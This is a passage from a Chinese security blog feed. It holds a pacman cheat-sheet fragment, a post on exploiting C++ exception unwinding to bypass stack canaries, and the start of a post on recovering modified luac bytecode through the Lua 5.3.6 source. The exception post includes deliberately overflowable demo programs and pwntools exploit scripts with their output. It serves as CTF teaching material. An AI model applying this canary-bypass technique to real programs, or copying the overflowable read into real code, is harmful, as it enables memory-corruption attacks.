软件包名</code></p><p>卸载一个包并删除所有依赖</p><p><code>pacman -Rs 软件包名</code></p><p>删除一个包，以及其不被其他包所需要的依赖项</p><p><strong>升级</strong></p><p><code>pacman -Syu</code></p><ul><li><code>S</code> 代表同步</li><li><code>y</code> 代表更新本地存储库</li><li><code>u</code> 代表系统更新</li></ul>]]></content>
    
    
    <summary type="html">arch</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>关于Cpp异常类pwn</title>
    <link href="https://ixout.github.io/posts/14386/"/>
    <id>https://ixout.github.io/posts/14386/</id>
    <published>2024-11-04T07:46:12.000Z</published>
    <updated>2024-11-10T13:58:46.586Z</updated>
    
    <content type="html"><![CDATA[<p>好久没有学新东西了,因为菜所以摆因为摆所以越来越菜:[</p><h1 id="cpp异常pwn"><a href="#cpp异常pwn" class="headerlink" title="cpp异常pwn"></a>cpp异常pwn</h1><p>最近有打的比赛遇到几次cpp异常pwn题,只简单考虑pwn中的出现的话,了解这一块就足够用了</p><p>当一个异常被抛出程序便会去寻找能够处理该异常的catch</p><p>有两种情况</p><ul><li>当前层存在对应的catch就会执行catch块中的代码</li><li>当前层若无catch就会向上逆着程序调用寻找可处理的catch,如果未寻找到程序则会报错退出</li></ul><p>在ctf中出现主要是第二种情况,即有一个vuln函数存在异常抛出但在本层却没有能够处理的catch</p><p>简单写一个demo</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdexcept&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;foo func&quot;</span>&lt;&lt;std::endl;</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;foo exception&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(...)&#123;</span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;foo catch&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;foo continue&quot;</span>&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>)&gt;<span class="number">32</span>)</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;thorw trigger&quot;</span>);</span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;no exception&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(...)&#123;</span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;catch trigger&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;continue&quot;</span>&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译<code>g++ -g -o test1 ./test.cc -no-pie</code></p><p>这个时候由于本层就有能够处理的catch,所以运行脚本栈溢出会失败</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404800</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss)+p64(<span class="number">0x4012D4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python 3.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./test1&#x27;</span>: pid 51227</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">catch trigger</span><br><span class="line"><span class="built_in">continue</span></span><br><span class="line">*** stack smashing detected ***: terminated</span><br></pre></td></tr></table></figure><p>但如果本层没有对应的catch处理</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdexcept&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;foo func&quot;</span>&lt;&lt;std::endl;</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;foo exception&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(...)&#123;</span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;foo catch&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;foo continue&quot;</span>&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>)&gt;<span class="number">32</span>)</span><br><span class="line"><span class="keyword">throw</span> std::<span class="built_in">runtime_error</span>(<span class="string">&quot;thorw trigger&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> std::cout&lt;&lt;<span class="string">&quot;no exception&quot;</span>&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line">std::cout&lt;&lt;<span class="string">&quot;continue&quot;</span>&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样编译<code>g++ -g -o test1 ./test.cc -no-pie</code></p><p>这时候运行脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404800</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss)+p64(<span class="number">0x4012d0</span>))//<span class="number">0x4012d0</span>即foo中<span class="keyword">try</span>的位置</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python 3.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./test&#x27;</span>: pid 51889</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">foo catch</span><br><span class="line">foo <span class="built_in">continue</span></span><br><span class="line"><span class="built_in">continue</span></span><br></pre></td></tr></table></figure><p>可以看到因为本层不存在可用的catch,所以程序通过调用栈逆向寻找catch,但由于调用栈已经被我们控制为foo的try,所以程序就会去foo中寻找catch,这样就绕过了canary</p><p>需要注意的一点,劫持的返回地址需要位于一个try块中,且不能是try块的起始地址(异常抛出了总不能还没开始执行try吧)</p><h2 id="例题2024羊城-logger"><a href="#例题2024羊城-logger" class="headerlink" title="例题2024羊城-logger"></a>例题2024羊城-logger</h2><h2 id="例题2024强网杯-expect-number"><a href="#例题2024强网杯-expect-number" class="headerlink" title="例题2024强网杯-expect_number"></a>例题2024强网杯-expect_number</h2><h1 id="cpp异常实现"><a href="#cpp异常实现" class="headerlink" title="cpp异常实现"></a>cpp异常实现</h1><p>但如果想要真正理解cpp异常处理的逻辑实现,包括异常如何被抛出如何捕获,栈展开的过程,那需要学习的东西就挺多了</p><p>具体标准参考Itanium C++ ABI中的异常处理实现<a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html">C++ ABI for Itanium: Exception Handling</a></p><p>这里推荐一个仓库<a href="https://github.com/nicolasbrailo/cpp_exception_handling_abi/tree/master?tab=readme-ov-file">nicolasbrailo/cpp_exception_handling_abi: A mini ABI capable of handling throw/catch statements for C++ without libstdc++</a></p><p>通过代码自己实现一套基本的cpp异常处理,认真学完会有很大收获,这是对应的博客教程<a href="https://nicolasbrailo.github.io/blog/2013/2.html#cexceptionsunderthehood">Posts for 2013 February Nico Brailovsky’s thought repository</a></p><p>知乎也有对应的翻译<a href="https://zhuanlan.zhihu.com/p/656940263">C++异常处理的底层机制 - 知乎</a></p>]]></content>
    
    
    <summary type="html">cppppppppp</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="cpp" scheme="https://ixout.github.io/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>还原魔改luac</title>
    <link href="https://ixout.github.io/posts/15971/"/>
    <id>https://ixout.github.io/posts/15971/</id>
    <published>2024-09-27T02:45:46.000Z</published>
    <updated>2024-09-29T12:54:28.382Z</updated>
    
    <content type="html"><![CDATA[<p>在IOT漏洞挖掘的过程中常常会遇到luci模式的cgi,其中多数都会对其进行编译为字节码,网络上已经有不少关于unluac的项目,例如<a href="https://sourceforge.net/projects/unluac/files/">unluac - Browse Files at SourceForge.net</a>,但是还有一些厂商会对luac进行魔改,这就使得一般的unluac失效</p><p>之前就曾尝试过学习恢复魔改luac,可惜一直没啥头绪,前段时间和学长交流了下,学长给了篇自己写的文章<a href="https://forum.butian.net/share/3744">奇安信攻防社区-还原iot设备中魔改的luac (butian.net)</a>,学习一下</p><p>关于lua虚拟机可以参考<a href="https://cloud.tencent.com/developer/article/1648925">深入理解 Lua 虚拟机-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>学长的文章中只展示了部分关键代码,所以还是自己需要自己阅读源码,以下代码无特殊标注皆选自lua5.3.6</p><h2 id="lua"><a href="#lua" class="headerlink" title="lua"></a>lua</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a><strong>main</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> status, result;</span><br><span class="line">  lua_State *L = luaL_newstate();  <span class="comment">/* create state */</span></span><br><span class="line">  <span class="keyword">if</span> (L == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    l_message(argv[<span class="number">0</span>], <span class="string">&quot;cannot create state: not enough memory&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">  &#125;</span><br><span class="line">  lua_pushcfunction(L, &amp;pmain);  <span class="comment">/* to call &#x27;pmain&#x27; in protected mode */</span></span><br><span class="line">  lua_pushinteger(L, argc);  <span class="comment">/* 1st argument */</span></span><br><span class="line">  lua_pushlightuserdata(L, argv); <span class="comment">/* 2nd argument */</span></span><br><span class="line">  status = lua_pcall(L, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);  <span class="comment">/* do the call */</span></span><br><span class="line">  result = lua_toboolean(L, <span class="number">-1</span>);  <span class="comment">/* get result */</span></span><br><span class="line">  report(L, status);</span><br><span class="line">  lua_close(L);</span><br><span class="line">  <span class="keyword">return</span> (result &amp;&amp; status == LUA_OK) ? EXIT_SUCCESS : EXIT_FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到只是一些初始化工作,创建lua状态机等</p><h3 id="pmain"><a href="#pmain" class="headerlink" title="pmain"></a><strong>pmain</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">pmain</span> <span class="params">(lua_State *L)</span> &#123;</span><br><span class="line">  <span class="type">int</span> argc = (<span class="type">int</span>)lua_tointeger(L, <span class="number">1</span>);</span><br><span class="line">  <span class="type">char</span> **argv = (<span class="type">char</span> **)lua_touserdata(L, <span class="number">2</span>);</span><br><span class="line">  <span class="type">int</span> script;</span><br><span class="line">  <span class="type">int</span> args = collectargs(argv, &amp;script);</span><br><span class="line">  luaL_checkversion(L);  <span class="comment">/* check that interpreter has correct version */</span></span><br><span class="line">  <span class="keyword">if</span> (argv[<span class="number">0</span>] &amp;&amp; argv[<span class="number">0</span>][<span class="number">0</span>]) progname = argv[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (args == has_error) &#123;  <span class="comment">/* bad arg? */</span></span><br><span class="line">    print_usage(argv[script]);  <span class="comment">/* &#x27;script&#x27; has index of bad arg. */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (args &amp; has_v)  <span class="comment">/* option &#x27;-v&#x27;? */</span></span><br><span class="line">    print_version();</span><br><span class="line">  <span class="keyword">if</span> (args &amp; has_E) &#123;  <span class="comment">/* option &#x27;-E&#x27;? */</span></span><br><span class="line">    lua_pushboolean(L, <span class="number">1</span>);  <span class="comment">/* signal for libraries to ignore env. vars. */</span></span><br><span class="line">    lua_setfield(L, LUA_REGISTRYINDEX, <span class="string">&quot;LUA_NOENV&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  luaL_openlibs(L);  <span class="comment">/* open standard libraries */</span></span><br><span class="line">  createargtable(L, argv, argc, script);  <span class="comment">/* create table &#x27;arg&#x27; */</span></span><br><span class="line">  <span class="keyword">if</span> (!(args &amp; has_E)) &#123;  <span class="comment">/* no option &#x27;-E&#x27;? */</span></span><br><span class="line">    <span class="keyword">if</span> (handle_luainit(L) != LUA_OK)  <span class="comment">/* run LUA_INIT */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">/* error running LUA_INIT */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!runargs(L, argv, script))  <span class="comment">/* execute arguments -e and -l */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">/* something failed */</span></span><br><span class="line">  <span class="keyword">if</span> (script &lt; argc &amp;&amp;  <span class="comment">/* execute main script (if there is one) */</span></span><br><span class="line">      handle_script(L, argv + script) != LUA_OK)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (args &amp; has_i)  <span class="comment">/* -i option? */</span></span><br><span class="line">    doREPL(L);  <span class="comment">/* do read-eval-print loop */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (script == argc &amp;&amp; !(args &amp; (has_e | has_v))) &#123;  <span class="comment">/* no arguments? */</span></span><br><span class="line">    <span class="keyword">if</span> (lua_stdin_is_tty()) &#123;  <span class="comment">/* running in interactive mode? */</span></span><br><span class="line">      print_version();</span><br><span class="line">      doREPL(L);  <span class="comment">/* do read-eval-print loop */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> dofile(L, <span class="literal">NULL</span>);  <span class="comment">/* executes stdin as a file */</span></span><br><span class="line">  &#125;</span><br><span class="line">  lua_pushboolean(L, <span class="number">1</span>);  <span class="comment">/* signal no errors */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>官方的注释已经非常详细了,可以知道当给出了目标文件会进入分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (script &lt; argc &amp;&amp;  <span class="comment">/* execute main script (if there is one) */</span></span><br><span class="line">    handle_script(L, argv + script) != LUA_OK)</span><br></pre></td></tr></table></figure><h3 id="handle-script"><a href="#handle-script" class="headerlink" title="handle_script"></a><strong>handle_script</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handle_script</span> <span class="params">(lua_State *L, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *fname = argv[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(fname, <span class="string">&quot;-&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="built_in">strcmp</span>(argv[<span class="number">-1</span>], <span class="string">&quot;--&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">    fname = <span class="literal">NULL</span>;  <span class="comment">/* stdin */</span></span><br><span class="line">  status = luaL_loadfile(L, fname);</span><br><span class="line">  <span class="keyword">if</span> (status == LUA_OK) &#123;</span><br><span class="line">    <span class="type">int</span> n = pushargs(L);  <span class="comment">/* push arguments to script */</span></span><br><span class="line">    status = docall(L, n, LUA_MULTRET);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> report(L, status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的核心在于<code>luaL_loadfile(L, fname);</code></p><p><code>#define luaL_loadfile(L,f)  luaL_loadfilex(L,f,NULL)</code></p><p><code>luaL_loadfile</code>实际上就是<code>luaL_loadfilex</code></p><h3 id="luaL-loadfile"><a href="#luaL-loadfile" class="headerlink" title="luaL_loadfile"></a><strong>luaL_loadfile</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">LUALIB_API <span class="type">int</span> <span class="title function_">luaL_loadfilex</span> <span class="params">(lua_State *L, <span class="type">const</span> <span class="type">char</span> *filename,</span></span><br><span class="line"><span class="params">                                             <span class="type">const</span> <span class="type">char</span> *mode)</span> &#123;</span><br><span class="line">  LoadF lf;</span><br><span class="line">  <span class="type">int</span> status, readstatus;</span><br><span class="line">  <span class="type">int</span> c;</span><br><span class="line">  <span class="type">int</span> fnameindex = lua_gettop(L) + <span class="number">1</span>;  <span class="comment">/* index of filename on the stack */</span></span><br><span class="line">  <span class="keyword">if</span> (filename == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    lua_pushliteral(L, <span class="string">&quot;=stdin&quot;</span>);</span><br><span class="line">    lf.f = <span class="built_in">stdin</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    lua_pushfstring(L, <span class="string">&quot;@%s&quot;</span>, filename);</span><br><span class="line">    lf.f = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf.f == <span class="literal">NULL</span>) <span class="keyword">return</span> errfile(L, <span class="string">&quot;open&quot;</span>, fnameindex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (skipcomment(&amp;lf, &amp;c))  <span class="comment">/* read initial portion */</span></span><br><span class="line">    lf.buff[lf.n++] = <span class="string">&#x27;\n&#x27;</span>;  <span class="comment">/* add line to correct line numbers */</span></span><br><span class="line">  <span class="keyword">if</span> (c == LUA_SIGNATURE[<span class="number">0</span>] &amp;&amp; filename) &#123;  <span class="comment">/* binary file? */</span></span><br><span class="line">    lf.f = freopen(filename, <span class="string">&quot;rb&quot;</span>, lf.f);  <span class="comment">/* reopen in binary mode */</span></span><br><span class="line">    <span class="keyword">if</span> (lf.f == <span class="literal">NULL</span>) <span class="keyword">return</span> errfile(L, <span class="string">&quot;reopen&quot;</span>, fnameindex);</span><br><span class="line">    skipcomment(&amp;lf, &amp;c);  <span class="comment">/* re-read initial portion */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (c != EOF)</span><br><span class="line">    lf.buff[lf.n++] = c;  <span class="comment">/* &#x27;c&#x27; is the first character of the stream */</span></span><br><span class="line">  status = lua_load(L, getF, &amp;lf, lua_tostring(L, <span class="number">-1</span>), mode);</span><br><span class="line">  readstatus = ferror(lf.f);</span><br><span class="line">  <span class="keyword">if</span> (filename) fclose(lf.f);  <span class="comment">/* close file (even in case of errors) */</span></span><br><span class="line">  <span class="keyword">if</span> (readstatus) &#123;</span><br><span class="line">    lua_settop(L, fnameindex);  <span class="comment">/* ignore results from &#x27;lua_load&#x27; */</span></span><br><span class="line">    <span class="keyword">return</span> errfile(L, <span class="string">&quot;read&quot;</span>, fnameindex);</span><br><span class="line">  &#125;</span><br><span class="line">  lua_remove(L, fnameindex);</span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这个函数开始就到了真正解析luac文件的部分</p><p><code>lf</code> 是一个 <code>LoadF</code> 结构，包含了文件相关的部分信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LoadF</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> n;  <span class="comment">/* number of pre-read characters */</span></span><br><span class="line">  FILE *f;  <span class="comment">/* file being read */</span></span><br><span class="line">  <span class="type">char</span> buff[BUFSIZ];  <span class="comment">/* area for reading file */</span></span><br><span class="line">&#125; LoadF;</span><br></pre></td></tr></table></figure><p>关注luac相关处理部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (c == LUA_SIGNATURE[<span class="number">0</span>] &amp;&amp; filename) &#123;  <span class="comment">/* binary file? */</span></span><br><span class="line">  lf.f = freopen(filename, <span class="string">&quot;rb&quot;</span>, lf.f);  <span class="comment">/* reopen in binary mode */</span></span><br><span class="line">  <span class="keyword">if</span> (lf.f == <span class="literal">NULL</span>) <span class="keyword">return</span> errfile(L, <span class="string">&quot;reopen&quot;</span>, fnameindex);</span><br><span class="line">  skipcomment(&amp;lf, &amp;c);  <span class="comment">/* re-read initial portion */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>#define LUA_SIGNATURE &quot;\033Lua&quot;</code></p><p>所以当文件的第一个字节是<code>1b</code>的时候会被认为是luac编译后的字节码文件,并重新以二进制模式（<code>&quot;rb&quot;</code>）打开文件,逐个读取字节直到<code>EOF</code>或者<code>1B</code>,</p><p>跳过可能存在的 Unix 执行标识行</p><h3 id="lua-load"><a href="#lua-load" class="headerlink" title="lua_load"></a>lua_load</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LUA_API <span class="type">int</span> <span class="title function_">lua_load</span> <span class="params">(lua_State *L, lua_Reader reader, <span class="type">void</span> *data,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">char</span> *chunkname, <span class="type">const</span> <span class="type">char</span> *mode)</span> &#123;</span><br><span class="line">  ZIO z;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  lua_lock(L);</span><br><span class="line">  <span class="keyword">if</span> (!chunkname) chunkname = <span class="string">&quot;?&quot;</span>;</span><br><span class="line">  luaZ_init(L, &amp;z, reader, data);</span><br><span class="line">  status = luaD_protectedparser(L, &amp;z, chunkname, mode);</span><br><span class="line">  <span class="keyword">if</span> (status == LUA_OK) &#123;  <span class="comment">/* no errors? */</span></span><br><span class="line">    LClosure *f = clLvalue(L-&gt;top - <span class="number">1</span>);  <span class="comment">/* get newly created function */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;nupvalues 